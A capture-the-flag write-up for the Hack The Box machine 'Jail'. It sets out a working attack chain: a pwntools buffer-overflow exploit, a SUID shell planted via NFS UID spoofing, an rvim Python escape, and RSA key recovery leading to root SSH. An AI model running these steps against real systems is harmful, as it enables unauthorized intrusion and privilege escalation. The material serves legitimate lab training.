# HTB: Jail — Writeup

**Difficulty:** Insane | **OS:** Linux | **IP:** 10.10.10.34

## Summary

Jail is a multi-stage machine involving a stack buffer overflow with socket-reuse
shellcode against a custom service, NFS misconfiguration abuse via UID spoofing
to plant a SUID binary, a vim restricted mode escape via Python, and finally
RSA private key recovery using Wiener's attack against a weak public key.

---

## Enumeration

```bash
nmap -sV -sC -oA nmap/jail 10.10.10.34
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 6.6.1p1
80/tcp    open  http     Apache httpd 2.4.6 (CentOS)
111/tcp   open  rpcbind  2-4
2049/tcp  open  nfs
7411/tcp  open  unknown  [custom jail service]
20048/tcp open  mountd
```

```bash
showmount -e 10.10.10.34
# /opt          *(rw,sync,root_squash,no_all_squash)
# /var/nfsshare *(rw,sync,root_squash,no_all_squash)
```

Source code available at: `http://10.10.10.34/jailuser/dev/jail.c`

---

## Foothold — Stack Buffer Overflow (nobody shell)

### Vulnerability Analysis

From `jail.c`:

```c
char userpass[16];

int auth(char *username, char *password) {
    strcpy(userpass, password);  // no bounds check
    ...
}
```

Compiled with `-z execstack` (stack executable, no NX).
Hardcoded credentials: `admin / 1974jailbreak!`

### Information Leak via DEBUG Mode

```
nc 10.10.10.34 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
DEBUG
OK DEBUG mode on.
PASS AAAA
DEBUG: userpass buffer @ 0xffffd610
```

### Finding the Offset

```bash
msf-pattern_create -l 100
# Send as PASS, capture crash EIP
msf-pattern_offset -l 100 -q <crashed_EIP>
# Exact match at offset 28
```

### Exploit — Socket-Reuse Shellcode

Egress TCP filtering blocks reverse shells. Use socket-reuse shellcode
to get a shell over the existing connection:

```python
from pwn import *

r = remote('10.10.10.34', 7411)
r.sendline('USER admin')
r.sendline('DEBUG')
r.recvuntil('buffer @ ')
buf_addr = int(r.recvline().strip(), 16)

payload  = b'A' * 28
payload += p32(buf_addr + 32)   # return into shellcode
payload += b'\x90' * 16         # NOP sled
payload += socket_reuse_shellcode

r.sendline(b'PASS ' + payload)
r.interactive()
# uid=99(nobody)
```

---

## Privilege Escalation — nobody → frank (NFS UID Spoofing)

`no_all_squash` on the NFS export means files created with UID 1000 locally
are owned by UID 1000 on the remote share. `frank` is UID 1000.

On the attacker machine:

```bash
sudo useradd -u 1000 frank
sudo -u frank bash
sudo mount -t nfs 10.10.10.34:/var/nfsshare /tmp/nfs

cat > /tmp/shell.c << 'EOF'
#include <stdlib.h>
int main() {
    setresuid(1000,1000,1000);
    system("/bin/bash");
    return 0;
}
EOF

gcc -o /tmp/nfs/shell /tmp/shell.c
chmod 4777 /tmp/nfs/shell
```

In the `nobody` shell on Jail:

```bash
/var/nfsshare/shell
# uid=1000(frank)
cat /home/frank/user.txt
```

**User flag captured.**

---

## Privilege Escalation — frank → adm (rvim Python Escape)

```bash
sudo -l
# (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

```bash
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

Escape via Python:

```vim
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec bash")
```

Shell as `uid=3(adm)`.

---

## Privilege Escalation — adm → root (RSA Wiener Attack)

```bash
ls /var/adm/.keys/
# note.txt  .local/  keys.rar

cat /var/adm/.keys/note.txt
# "Remember to use a strong password: LastName + Year + Symbol"

cat /var/adm/.keys/.local/.frank
# [Atbash cipher — decode at quipquip.com]
# Decoded: "...Nobody will guess...Escaped from Alcatraz alive like I did!"
```

Frank Morris escaped Alcatraz in 1962.

```bash
unrar x keys.rar  # password: Morris1962!
# Extracts: rootauthorizedsshkey.pub
```

The public key uses a small private exponent — vulnerable to Wiener's attack:

```bash
python RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
# Recovers private key
```

```bash
ssh -i recovered_private_key root@10.10.10.34
cat /root/root.txt
```

**Root flag captured.**

---

## Attack Chain

```
Port 7411 (jail service) + source via HTTP
  → strcpy BOF (offset 28, execstack)
  → DEBUG mode leaks buffer address
  → Socket-reuse shellcode → nobody shell
  → NFS no_all_squash + UID 1000 spoofing → SUID binary → frank
  → sudo rvim → :py os.execl → adm shell
  → /var/adm/.keys/ → Atbash decode → Morris1962! → unrar
  → RSA Wiener attack → root private key → root.txt
```

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | TCP/UDP service enumeration |
| showmount | NFS export enumeration |
| msf-pattern_create | Buffer overflow offset calculation |
| pwntools | Exploit development |
| gcc | Compile SUID binary on attacker |
| rvim | Sudo escape vector |
| RsaCtfTool | RSA Wiener attack |
| unrar | Archive extraction |
